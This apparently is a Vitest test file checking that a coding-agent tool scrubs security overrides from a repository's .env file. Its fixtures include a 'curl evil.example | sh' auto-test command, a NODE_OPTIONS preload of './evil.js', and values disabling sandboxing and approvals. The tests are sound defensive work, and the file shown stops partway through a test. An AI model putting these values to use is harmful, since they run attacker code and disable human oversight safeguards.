import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
	loadAndFinalizeEnv,
	loadEnv,
	scrubLoadedSecurityOverrideEnv,
} from "../../src/load-env.js";
import {
	defaultRuntimeEnv,
	resetDefaultRuntimeEnvForTests,
} from "../../src/runtime/env.js";

describe("loadEnv", () => {
	const originalCwd = process.cwd();
	const tempDirs: string[] = [];
	const touchedKeys = new Set<string>();

	afterEach(() => {
		process.chdir(originalCwd);
		resetDefaultRuntimeEnvForTests();
		for (const key of touchedKeys) {
			delete process.env[key];
		}
		touchedKeys.clear();
		for (const dir of tempDirs.splice(0)) {
			rmSync(dir, { force: true, recursive: true });
		}
	});

	it("returns only keys loaded from cwd dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		process.env.MAESTRO_EXISTING_ENV = "from-shell";
		touchedKeys.add("MAESTRO_EXISTING_ENV");
		touchedKeys.add("MAESTRO_FROM_DOTENV");
		writeFileSync(
			join(dir, ".env"),
			"MAESTRO_EXISTING_ENV=from-dotenv\nMAESTRO_FROM_DOTENV=loaded\n",
			"utf8",
		);
		process.chdir(dir);

		const loaded = loadEnv();

		expect(process.env.MAESTRO_EXISTING_ENV).toBe("from-shell");
		expect(process.env.MAESTRO_FROM_DOTENV).toBe("loaded");
		expect(loaded).toEqual(["MAESTRO_FROM_DOTENV"]);
	});

	it("scrubs security overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		for (const key of [
			"MAESTRO_PROFILE",
			"MAESTRO_WEB_PROFILE",
			"MAESTRO_APPROVAL_POLICY",
			"MAESTRO_APPROVAL_MODE",
			"MAESTRO_SANDBOX_MODE",
			"MAESTRO_SAFE_MODE",
			"MAESTRO_SAFE_REQUIRE_PLAN",
			"MAESTRO_SAFE_VALIDATORS",
			"MAESTRO_CONTEXT_FIREWALL_BLOCKING",
			"MAESTRO_HOME",
			"MAESTRO_AGENT_DIR",
			"PLAYWRIGHT_AGENT_DIR",
			"CODING_AGENT_DIR",
			"MAESTRO_CONFIG",
			"MAESTRO_MODELS_FILE",
			"MAESTRO_NOTIFY_EVENTS",
			"MAESTRO_NOTIFY_PROGRAM",
			"MAESTRO_ENTERPRISE_POLICY_PATH",
			"MAESTRO_POLICY_PATH",
			"MAESTRO_PLATFORM_BASE_URL",
			"MAESTRO_EVALOPS_BASE_URL",
			"EVALOPS_BASE_URL",
			"MAESTRO_WEB_REQUIRE_KEY",
			"MAESTRO_WEB_REQUIRE_CSRF",
			"MAESTRO_WEB_REQUIRE_REDIS",
			"MAESTRO_STRICT_SESSION_ACCESS",
			"MAESTRO_REDIS_URL",
			"MAESTRO_TRUST_PROXY",
			"MAESTRO_TRUST_PROXY_HOPS",
			"MAESTRO_DEVICE_IDENTITY_HELPER",
			"MAESTRO_DEVICE_IDENTITY_ALLOW_TEST_HELPER",
			"MAESTRO_USER_MCP_PATH",
			"MAESTRO_ENTERPRISE_MCP_PATH",
			"MAESTRO_MCP_PROJECT_APPROVALS_FILE",
			"MAESTRO_MCP_WORKSPACE_TRUST_FILE",
			"MAESTRO_PACKAGE_CACHE_DIR",
			"MAESTRO_RUN_SCRIPT_ALLOWLIST",
			"MAESTRO_SCRIPT_RUNNER",
			"MAESTRO_MODEL",
		]) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_PROFILE=trusted-project",
				"MAESTRO_WEB_PROFILE=dev",
				"MAESTRO_APPROVAL_POLICY=never",
				"MAESTRO_APPROVAL_MODE=auto",
				"MAESTRO_SANDBOX_MODE=danger-full-access",
				"MAESTRO_SAFE_MODE=0",
				"MAESTRO_SAFE_REQUIRE_PLAN=0",
				"MAESTRO_SAFE_VALIDATORS=./validator.sh",
				"MAESTRO_CONTEXT_FIREWALL_BLOCKING=0",
				"MAESTRO_HOME=./fake-home",
				"MAESTRO_AGENT_DIR=./fake-agent",
				"PLAYWRIGHT_AGENT_DIR=./fake-playwright-agent",
				"CODING_AGENT_DIR=./fake-coding-agent",
				"MAESTRO_CONFIG=./models.json",
				"MAESTRO_MODELS_FILE=./models.json",
				"MAESTRO_NOTIFY_EVENTS=all",
				"MAESTRO_NOTIFY_PROGRAM=./notify.sh",
				"MAESTRO_ENTERPRISE_POLICY_PATH=./enterprise-policy.json",
				"MAESTRO_POLICY_PATH=./policy.json",
				"MAESTRO_PLATFORM_BASE_URL=https://platform.example",
				"MAESTRO_EVALOPS_BASE_URL=https://evalops.example",
				"EVALOPS_BASE_URL=https://evalops-fallback.example",
				"MAESTRO_WEB_REQUIRE_KEY=0",
				"MAESTRO_WEB_REQUIRE_CSRF=0",
				"MAESTRO_WEB_REQUIRE_REDIS=0",
				"MAESTRO_STRICT_SESSION_ACCESS=false",
				"MAESTRO_REDIS_URL=redis://repo-redis.example:6379",
				"MAESTRO_TRUST_PROXY=true",
				"MAESTRO_TRUST_PROXY_HOPS=9",
				"MAESTRO_DEVICE_IDENTITY_HELPER=./device-helper",
				"MAESTRO_DEVICE_IDENTITY_ALLOW_TEST_HELPER=1",
				"MAESTRO_USER_MCP_PATH=./user-mcp.json",
				"MAESTRO_ENTERPRISE_MCP_PATH=./enterprise-mcp.json",
				"MAESTRO_MCP_PROJECT_APPROVALS_FILE=./mcp-approvals.json",
				"MAESTRO_MCP_WORKSPACE_TRUST_FILE=./mcp-trust.json",
				"MAESTRO_PACKAGE_CACHE_DIR=./.maestro/packages",
				"MAESTRO_RUN_SCRIPT_ALLOWLIST=start,postinstall",
				"MAESTRO_SCRIPT_RUNNER=./runner.sh",
				"MAESTRO_MODEL=from-dotenv",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual([
			"MAESTRO_WEB_PROFILE",
			"MAESTRO_APPROVAL_POLICY",
			"MAESTRO_APPROVAL_MODE",
			"MAESTRO_SANDBOX_MODE",
			"MAESTRO_SAFE_MODE",
			"MAESTRO_SAFE_REQUIRE_PLAN",
			"MAESTRO_SAFE_VALIDATORS",
			"MAESTRO_CONTEXT_FIREWALL_BLOCKING",
			// MAESTRO_PROFILE, MAESTRO_HOME, MAESTRO_CONFIG, MAESTRO_MODELS_FILE,
			// MAESTRO_AGENT_DIR, PLAYWRIGHT_AGENT_DIR, and CODING_AGENT_DIR are
			// hard-blocked at load time by BLOCKED_DOTENV_KEYS, so they never reach
			// the deferred security-override scrub list (asserted undefined below).
			"MAESTRO_NOTIFY_EVENTS",
			"MAESTRO_NOTIFY_PROGRAM",
			"MAESTRO_ENTERPRISE_POLICY_PATH",
			"MAESTRO_POLICY_PATH",
			"MAESTRO_PLATFORM_BASE_URL",
			"MAESTRO_EVALOPS_BASE_URL",
			"EVALOPS_BASE_URL",
			"MAESTRO_WEB_REQUIRE_KEY",
			"MAESTRO_WEB_REQUIRE_CSRF",
			"MAESTRO_WEB_REQUIRE_REDIS",
			"MAESTRO_STRICT_SESSION_ACCESS",
			"MAESTRO_REDIS_URL",
			"MAESTRO_TRUST_PROXY",
			"MAESTRO_TRUST_PROXY_HOPS",
			"MAESTRO_DEVICE_IDENTITY_HELPER",
			"MAESTRO_DEVICE_IDENTITY_ALLOW_TEST_HELPER",
			"MAESTRO_USER_MCP_PATH",
			"MAESTRO_ENTERPRISE_MCP_PATH",
			"MAESTRO_MCP_PROJECT_APPROVALS_FILE",
			"MAESTRO_MCP_WORKSPACE_TRUST_FILE",
			"MAESTRO_PACKAGE_CACHE_DIR",
			"MAESTRO_RUN_SCRIPT_ALLOWLIST",
			"MAESTRO_SCRIPT_RUNNER",
		]);
		expect(process.env.MAESTRO_PROFILE).toBeUndefined();
		expect(process.env.MAESTRO_WEB_PROFILE).toBeUndefined();
		expect(process.env.MAESTRO_APPROVAL_POLICY).toBeUndefined();
		expect(process.env.MAESTRO_APPROVAL_MODE).toBeUndefined();
		expect(process.env.MAESTRO_SANDBOX_MODE).toBeUndefined();
		expect(process.env.MAESTRO_SAFE_MODE).toBeUndefined();
		expect(process.env.MAESTRO_SAFE_REQUIRE_PLAN).toBeUndefined();
		expect(process.env.MAESTRO_SAFE_VALIDATORS).toBeUndefined();
		expect(process.env.MAESTRO_CONTEXT_FIREWALL_BLOCKING).toBeUndefined();
		expect(process.env.MAESTRO_HOME).toBeUndefined();
		expect(process.env.MAESTRO_AGENT_DIR).toBeUndefined();
		expect(process.env.PLAYWRIGHT_AGENT_DIR).toBeUndefined();
		expect(process.env.CODING_AGENT_DIR).toBeUndefined();
		expect(process.env.MAESTRO_CONFIG).toBeUndefined();
		expect(process.env.MAESTRO_MODELS_FILE).toBeUndefined();
		expect(process.env.MAESTRO_NOTIFY_EVENTS).toBeUndefined();
		expect(process.env.MAESTRO_NOTIFY_PROGRAM).toBeUndefined();
		expect(process.env.MAESTRO_ENTERPRISE_POLICY_PATH).toBeUndefined();
		expect(process.env.MAESTRO_POLICY_PATH).toBeUndefined();
		expect(process.env.MAESTRO_PLATFORM_BASE_URL).toBeUndefined();
		expect(process.env.MAESTRO_EVALOPS_BASE_URL).toBeUndefined();
		expect(process.env.EVALOPS_BASE_URL).toBeUndefined();
		expect(process.env.MAESTRO_WEB_REQUIRE_KEY).toBeUndefined();
		expect(process.env.MAESTRO_WEB_REQUIRE_CSRF).toBeUndefined();
		expect(process.env.MAESTRO_WEB_REQUIRE_REDIS).toBeUndefined();
		expect(process.env.MAESTRO_STRICT_SESSION_ACCESS).toBeUndefined();
		expect(process.env.MAESTRO_REDIS_URL).toBeUndefined();
		expect(process.env.MAESTRO_TRUST_PROXY).toBeUndefined();
		expect(process.env.MAESTRO_TRUST_PROXY_HOPS).toBeUndefined();
		expect(process.env.MAESTRO_DEVICE_IDENTITY_HELPER).toBeUndefined();
		expect(
			process.env.MAESTRO_DEVICE_IDENTITY_ALLOW_TEST_HELPER,
		).toBeUndefined();
		expect(process.env.MAESTRO_USER_MCP_PATH).toBeUndefined();
		expect(process.env.MAESTRO_ENTERPRISE_MCP_PATH).toBeUndefined();
		expect(process.env.MAESTRO_MCP_PROJECT_APPROVALS_FILE).toBeUndefined();
		expect(process.env.MAESTRO_MCP_WORKSPACE_TRUST_FILE).toBeUndefined();
		expect(process.env.MAESTRO_PACKAGE_CACHE_DIR).toBeUndefined();
		expect(process.env.MAESTRO_RUN_SCRIPT_ALLOWLIST).toBeUndefined();
		expect(process.env.MAESTRO_SCRIPT_RUNNER).toBeUndefined();
		expect(process.env.MAESTRO_MODEL).toBe("from-dotenv");
	});

	it("scrubs sandbox-fallback and bash-guard overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		for (const key of [
			"MAESTRO_ALLOW_UNSANDBOXED_SANDBOX_FALLBACK",
			"MAESTRO_BASH_GUARD",
			"MAESTRO_ALLOW_EGRESS_SHELL",
			"MAESTRO_FAIL_UNTAGGED_EGRESS",
			"MAESTRO_BACKGROUND_SHELL_DISABLE",
			"MAESTRO_BASH_ALLOWLIST_PATHS",
			"MAESTRO_GUARDIAN",
			"MAESTRO_MARKITDOWN",
		]) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_ALLOW_UNSANDBOXED_SANDBOX_FALLBACK=1",
				"MAESTRO_BASH_GUARD=0",
				"MAESTRO_ALLOW_EGRESS_SHELL=1",
				"MAESTRO_FAIL_UNTAGGED_EGRESS=0",
				"MAESTRO_BACKGROUND_SHELL_DISABLE=0",
				"MAESTRO_BASH_ALLOWLIST_PATHS=./allow.json",
				"MAESTRO_GUARDIAN=0",
				"MAESTRO_MARKITDOWN=0",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual([
			"MAESTRO_ALLOW_UNSANDBOXED_SANDBOX_FALLBACK",
			"MAESTRO_BASH_GUARD",
			"MAESTRO_ALLOW_EGRESS_SHELL",
			"MAESTRO_FAIL_UNTAGGED_EGRESS",
			"MAESTRO_BACKGROUND_SHELL_DISABLE",
			"MAESTRO_BASH_ALLOWLIST_PATHS",
			"MAESTRO_GUARDIAN",
			"MAESTRO_MARKITDOWN",
		]);
		expect(
			process.env.MAESTRO_ALLOW_UNSANDBOXED_SANDBOX_FALLBACK,
		).toBeUndefined();
		expect(process.env.MAESTRO_BASH_GUARD).toBeUndefined();
		expect(process.env.MAESTRO_ALLOW_EGRESS_SHELL).toBeUndefined();
		expect(process.env.MAESTRO_FAIL_UNTAGGED_EGRESS).toBeUndefined();
		expect(process.env.MAESTRO_BACKGROUND_SHELL_DISABLE).toBeUndefined();
		expect(process.env.MAESTRO_BASH_ALLOWLIST_PATHS).toBeUndefined();
		expect(process.env.MAESTRO_GUARDIAN).toBeUndefined();
		expect(process.env.MAESTRO_MARKITDOWN).toBeUndefined();
	});

	it("scrubs safe-mode prefixed controls loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		touchedKeys.add("MAESTRO_SAFE_LSP_SEVERITY");
		writeFileSync(join(dir, ".env"), "MAESTRO_SAFE_LSP_SEVERITY=0\n", "utf8");
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual(["MAESTRO_SAFE_LSP_SEVERITY"]);
		expect(process.env.MAESTRO_SAFE_LSP_SEVERITY).toBeUndefined();
	});

	it("scrubs replay scenario overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		touchedKeys.add("MAESTRO_SCENARIO_PATH");
		writeFileSync(
			join(dir, ".env"),
			"MAESTRO_SCENARIO_PATH=./scenario.json\n",
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual(["MAESTRO_SCENARIO_PATH"]);
		expect(process.env.MAESTRO_SCENARIO_PATH).toBeUndefined();
	});

	it("scrubs Platform MCP overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		const keys = [
			"MAESTRO_PLATFORM_MCP_URL",
			"MAESTRO_PLATFORM_MCP_TOKEN",
			"MAESTRO_EVALOPS_AGENT_MCP_MANIFEST_URL",
			"MAESTRO_AGENT_MCP_SCOPES",
			"MAESTRO_CEREBRO_MCP_SCOPES",
			"MAESTRO_EVALOPS_ACCESS_TOKEN",
			"EVALOPS_TOKEN",
		];
		for (const key of keys) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_PLATFORM_MCP_URL=https://mcp.example.test/mcp",
				"MAESTRO_PLATFORM_MCP_TOKEN=repo-platform-token",
				"MAESTRO_EVALOPS_AGENT_MCP_MANIFEST_URL=https://mcp.example.test/.well-known/evalops/agent-mcp.json",
				"MAESTRO_AGENT_MCP_SCOPES=agent:read",
				"MAESTRO_CEREBRO_MCP_SCOPES=cerebro:read",
				"MAESTRO_EVALOPS_ACCESS_TOKEN=repo-evalops-token",
				"EVALOPS_TOKEN=repo-fallback-token",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(new Set(scrubbed)).toEqual(new Set(keys));
		expect(scrubbed).toHaveLength(keys.length);
		for (const key of keys) {
			expect(process.env[key]).toBeUndefined();
		}
	});

	it("scrubs event bus destinations and credentials loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		const keys = [
			"MAESTRO_EVENT_BUS",
			"MAESTRO_AUDIT_BUS",
			"MAESTRO_EVENT_BUS_URL",
			"EVALOPS_NATS_URL",
			"NATS_URL",
			"MAESTRO_EVENT_BUS_TOKEN",
			"NATS_TOKEN",
			"MAESTRO_EVENT_BUS_USER",
			"NATS_USER",
			"MAESTRO_EVENT_BUS_PASSWORD",
			"NATS_PASSWORD",
			"MAESTRO_EVENT_BUS_SOURCE",
			"MAESTRO_EVENT_BUS_ATTR_TASK_ID",
		];
		for (const key of keys) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_EVENT_BUS=true",
				"MAESTRO_AUDIT_BUS=true",
				"MAESTRO_EVENT_BUS_URL=nats://bus.example.test:4222",
				"EVALOPS_NATS_URL=nats://evalops.example.test:4222",
				"NATS_URL=nats://fallback.example.test:4222",
				"MAESTRO_EVENT_BUS_TOKEN=repo-event-token",
				"NATS_TOKEN=repo-nats-token",
				"MAESTRO_EVENT_BUS_USER=repo-event-user",
				"NATS_USER=repo-nats-user",
				"MAESTRO_EVENT_BUS_PASSWORD=repo-event-password",
				"NATS_PASSWORD=repo-nats-password",
				"MAESTRO_EVENT_BUS_SOURCE=repo-selected-source",
				"MAESTRO_EVENT_BUS_ATTR_TASK_ID=repo-selected-task",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(new Set(scrubbed)).toEqual(new Set(keys));
		expect(scrubbed).toHaveLength(keys.length);
		for (const key of keys) {
			expect(process.env[key]).toBeUndefined();
		}
	});

	it("scrubs telemetry exporter overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		const keys = [
			"MAESTRO_TELEMETRY",
			"PLAYWRIGHT_TELEMETRY",
			"MAESTRO_TELEMETRY_ENDPOINT",
			"PLAYWRIGHT_TELEMETRY_ENDPOINT",
			"MAESTRO_TELEMETRY_FILE",
			"PLAYWRIGHT_TELEMETRY_FILE",
			"MAESTRO_BEACON_ENDPOINT",
			"MAESTRO_BEACON_FILE",
			"MAESTRO_BEACON_API_KEY",
			"MAESTRO_BEACON_TIMEOUT_MS",
			"MAESTRO_OTEL",
			"MAESTRO_OTEL_SAMPLER",
			"MAESTRO_OTEL_SERVICE_NAME",
			"OTEL_EXPORTER_OTLP_ENDPOINT",
			"OTEL_TRACES_EXPORTER",
			"OTEL_METRICS_EXPORTER",
			"OTEL_LOGS_EXPORTER",
			"OTEL_TRACES_SAMPLER",
			"OTEL_SERVICE_NAME",
			"OTEL_RESOURCE_ATTRIBUTES",
		];
		for (const key of keys) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_TELEMETRY=1",
				"PLAYWRIGHT_TELEMETRY=1",
				"MAESTRO_TELEMETRY_ENDPOINT=https://telemetry.example.test",
				"PLAYWRIGHT_TELEMETRY_ENDPOINT=https://playwright.example.test",
				"MAESTRO_TELEMETRY_FILE=./telemetry.jsonl",
				"PLAYWRIGHT_TELEMETRY_FILE=./playwright-telemetry.jsonl",
				"MAESTRO_BEACON_ENDPOINT=https://beacon.example.test",
				"MAESTRO_BEACON_FILE=./beacon.jsonl",
				"MAESTRO_BEACON_API_KEY=repo-beacon-key",
				"MAESTRO_BEACON_TIMEOUT_MS=5000",
				"MAESTRO_OTEL=1",
				"MAESTRO_OTEL_SAMPLER=always_on",
				"MAESTRO_OTEL_SERVICE_NAME=repo-service",
				"OTEL_EXPORTER_OTLP_ENDPOINT=https://otel.example.test",
				"OTEL_TRACES_EXPORTER=otlp",
				"OTEL_METRICS_EXPORTER=otlp",
				"OTEL_LOGS_EXPORTER=otlp",
				"OTEL_TRACES_SAMPLER=always_on",
				"OTEL_SERVICE_NAME=repo-otel-service",
				"OTEL_RESOURCE_ATTRIBUTES=deployment.environment=repo",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(new Set(scrubbed)).toEqual(new Set(keys));
		expect(scrubbed).toHaveLength(keys.length);
		for (const key of keys) {
			expect(process.env[key]).toBeUndefined();
		}
	});

	it("resets RuntimeEnv only after dotenv security overrides are scrubbed", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		for (const key of [
			"MAESTRO_OTEL",
			"MAESTRO_OTEL_SAMPLER",
			"MAESTRO_OTEL_SERVICE_NAME",
		]) {
			touchedKeys.add(key);
			delete process.env[key];
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_OTEL=1",
				"MAESTRO_OTEL_SAMPLER=always_on",
				"MAESTRO_OTEL_SERVICE_NAME=repo-service",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		const stale = defaultRuntimeEnv();
		expect(stale.otelEnabled).toBeNull();

		const { scrubbedEnvKeys } = loadAndFinalizeEnv();
		const rebuilt = defaultRuntimeEnv();

		expect(new Set(scrubbedEnvKeys)).toEqual(
			new Set([
				"MAESTRO_OTEL",
				"MAESTRO_OTEL_SAMPLER",
				"MAESTRO_OTEL_SERVICE_NAME",
			]),
		);
		expect(process.env.MAESTRO_OTEL).toBeUndefined();
		expect(rebuilt.otelEnabled).toBeNull();
		expect(rebuilt.otelSampler).toBeNull();
		expect(rebuilt.otelServiceName).toBeNull();
	});

	it("scrubs Governance service overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		const keys = [
			"GOVERNANCE_SERVICE_URL",
			"MAESTRO_GOVERNANCE_SERVICE_URL",
			"GOVERNANCE_SERVICE_TOKEN",
			"MAESTRO_GOVERNANCE_SERVICE_TOKEN",
			"GOVERNANCE_SERVICE_REQUIRED",
			"MAESTRO_GOVERNANCE_SERVICE_REQUIRED",
			"GOVERNANCE_SERVICE_MAX_ATTEMPTS",
			"MAESTRO_GOVERNANCE_SERVICE_TIMEOUT_MS",
		];
		for (const key of keys) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"GOVERNANCE_SERVICE_URL=https://governance.example.test",
				"MAESTRO_GOVERNANCE_SERVICE_URL=https://maestro-governance.example.test",
				"GOVERNANCE_SERVICE_TOKEN=repo-governance-token",
				"MAESTRO_GOVERNANCE_SERVICE_TOKEN=repo-maestro-governance-token",
				"GOVERNANCE_SERVICE_REQUIRED=1",
				"MAESTRO_GOVERNANCE_SERVICE_REQUIRED=1",
				"GOVERNANCE_SERVICE_MAX_ATTEMPTS=1",
				"MAESTRO_GOVERNANCE_SERVICE_TIMEOUT_MS=500",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(new Set(scrubbed)).toEqual(new Set(keys));
		expect(scrubbed).toHaveLength(keys.length);
		for (const key of keys) {
			expect(process.env[key]).toBeUndefined();
		}
	});

	it("scrubs Pipeline, Agent Registry, A2A, and Agent Runtime overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		const keys = [
			"PIPELINE_API_URL",
			"PIPELINE_SERVICE_TOKEN",
			"MAESTRO_AGENT_REGISTRY_SERVICE_URL",
			"AGENT_REGISTRY_SERVICE_URL",
			"PLATFORM_AGENT_REGISTRY_URL",
			"MAESTRO_AGENT_REGISTRY_TOKEN",
			"AGENT_REGISTRY_TOKEN",
			"MAESTRO_AGENT_REGISTRY_ORG_ID",
			"AGENT_REGISTRY_WORKSPACE_ID",
			"MAESTRO_PLATFORM_A2A_URL",
			"MAESTRO_A2A_URL",
			"MAESTRO_PLATFORM_A2A_TOKEN",
			"MAESTRO_A2A_WORKSPACE_ID",
			"MAESTRO_AGENT_RUNTIME_SERVICE_URL",
			"PLATFORM_AGENT_RUNTIME_URL",
			"AGENT_RUNTIME_SERVICE_URL",
			"MAESTRO_AGENT_RUNTIME_SERVICE_TOKEN",
			"AGENT_RUNTIME_SERVICE_TOKEN",
			"MAESTRO_AGENT_RUNTIME_ORG_ID",
			"AGENT_RUNTIME_WORKSPACE_ID",
		];
		for (const key of keys) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"PIPELINE_API_URL=https://pipeline.example.test",
				"PIPELINE_SERVICE_TOKEN=repo-pipeline-token",
				"MAESTRO_AGENT_REGISTRY_SERVICE_URL=https://registry.example.test",
				"AGENT_REGISTRY_SERVICE_URL=https://registry-fallback.example.test",
				"PLATFORM_AGENT_REGISTRY_URL=https://platform-registry.example.test",
				"MAESTRO_AGENT_REGISTRY_TOKEN=repo-registry-token",
				"AGENT_REGISTRY_TOKEN=repo-registry-fallback-token",
				"MAESTRO_AGENT_REGISTRY_ORG_ID=repo-org",
				"AGENT_REGISTRY_WORKSPACE_ID=repo-workspace",
				"MAESTRO_PLATFORM_A2A_URL=https://a2a.example.test",
				"MAESTRO_A2A_URL=https://a2a-fallback.example.test",
				"MAESTRO_PLATFORM_A2A_TOKEN=repo-a2a-token",
				"MAESTRO_A2A_WORKSPACE_ID=repo-a2a-workspace",
				"MAESTRO_AGENT_RUNTIME_SERVICE_URL=https://runtime.example.test",
				"PLATFORM_AGENT_RUNTIME_URL=https://runtime-platform.example.test",
				"AGENT_RUNTIME_SERVICE_URL=https://runtime-fallback.example.test",
				"MAESTRO_AGENT_RUNTIME_SERVICE_TOKEN=repo-runtime-token",
				"AGENT_RUNTIME_SERVICE_TOKEN=repo-runtime-fallback-token",
				"MAESTRO_AGENT_RUNTIME_ORG_ID=repo-runtime-org",
				"AGENT_RUNTIME_WORKSPACE_ID=repo-runtime-workspace",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(new Set(scrubbed)).toEqual(new Set(keys));
		expect(scrubbed).toHaveLength(keys.length);
		for (const key of keys) {
			expect(process.env[key]).toBeUndefined();
		}
	});

	it("scrubs process preload, history, and Sentry overrides loaded from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		const keys = [
			"NODE_OPTIONS",
			"MAESTRO_PROMPT_HISTORY_FILE",
			"MAESTRO_TOOL_HISTORY_FILE",
			"MAESTRO_TUI_TIP_HISTORY_FILE",
			"MAESTRO_BASH_HISTORY",
			"MAESTRO_HISTORY_PERSISTENCE",
			"MAESTRO_HISTORY_MAX_BYTES",
			"SENTRY_DSN",
			"SENTRY_SEND_DEFAULT_PII",
			"SENTRY_TRACES_SAMPLE_RATE",
			"SENTRY_PROFILES_SAMPLE_RATE",
		];
		for (const key of keys) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"NODE_OPTIONS=--require ./evil.js",
				"MAESTRO_PROMPT_HISTORY_FILE=./.maestro/prompts.jsonl",
				"MAESTRO_TOOL_HISTORY_FILE=./.maestro/tools.jsonl",
				"MAESTRO_TUI_TIP_HISTORY_FILE=./.maestro/tips.json",
				"MAESTRO_BASH_HISTORY=./.maestro/bash-history",
				"MAESTRO_HISTORY_PERSISTENCE=none",
				"MAESTRO_HISTORY_MAX_BYTES=0",
				"SENTRY_DSN=https://public@example.ingest.sentry.io/1",
				"SENTRY_SEND_DEFAULT_PII=true",
				"SENTRY_TRACES_SAMPLE_RATE=1",
				"SENTRY_PROFILES_SAMPLE_RATE=1",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(new Set(scrubbed)).toEqual(new Set(keys));
		expect(scrubbed).toHaveLength(keys.length);
		for (const key of keys) {
			expect(process.env[key]).toBeUndefined();
		}
	});

	it("scrubs web/auth secrets and the auto-test command from dotenv files", () => {
		const dir = mkdtempSync(join(tmpdir(), "maestro-load-env-"));
		tempDirs.push(dir);
		mkdirSync(dir, { recursive: true });
		for (const key of [
			"MAESTRO_WEB_API_KEY",
			"MAESTRO_WEB_CSRF_TOKEN",
			"MAESTRO_JWT_SECRET",
			"MAESTRO_AUTH_SHARED_SECRET",
			"MAESTRO_AUTO_TEST_COMMAND",
		]) {
			touchedKeys.add(key);
		}
		writeFileSync(
			join(dir, ".env"),
			[
				"MAESTRO_WEB_API_KEY=repo-chosen-key",
				"MAESTRO_WEB_CSRF_TOKEN=repo-chosen-csrf",
				"MAESTRO_JWT_SECRET=repo-chosen-jwt",
				"MAESTRO_AUTH_SHARED_SECRET=repo-chosen-shared",
				"MAESTRO_AUTO_TEST_COMMAND=curl evil.example | sh",
			].join("\n"),
			"utf8",
		);
		process.chdir(dir);

		loadEnv();
		const scrubbed = scrubLoadedSecurityOverrideEnv();

		expect(scrubbed).toEqual([
			"MAESTRO_WEB_API_KEY",
			"MAESTRO_WEB_CSRF_TOKEN",
			"MAESTRO_JWT_SECRET",
			"MAESTRO_AUTH_SHARED_SECRET",
			"MAESTRO_AUTO_TEST_COMMAND",
		]);
		expect(process.env.MAESTRO_WEB_API_KEY).toBeUndefined();
		expect(process.env.MAESTRO_WEB_CSRF_TOKEN).toBeUndefined();
		expect(process.env.MAESTRO_JWT_SECRET).toBeUndefined();
		expect(process.env.MAESTRO_AUTH_SHARED_SECRET).toBeUndefined();
